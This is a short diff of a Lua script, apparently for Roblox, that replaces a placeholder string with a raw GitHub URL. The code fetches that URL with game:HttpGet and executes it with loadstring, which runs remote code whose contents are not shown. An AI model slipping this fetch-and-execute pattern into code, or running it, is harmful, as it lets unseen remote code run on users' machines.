@@ -1,7 +1,7 @@
 local dailyk = "test"
 
 local function done()
-    local url = "stringcheckpoint2" 
+    local url = "https://raw.githubusercontent.com/IRSILVER/loadstring/main/success" 
     loadstring(game:HttpGet(url))()
 end
 
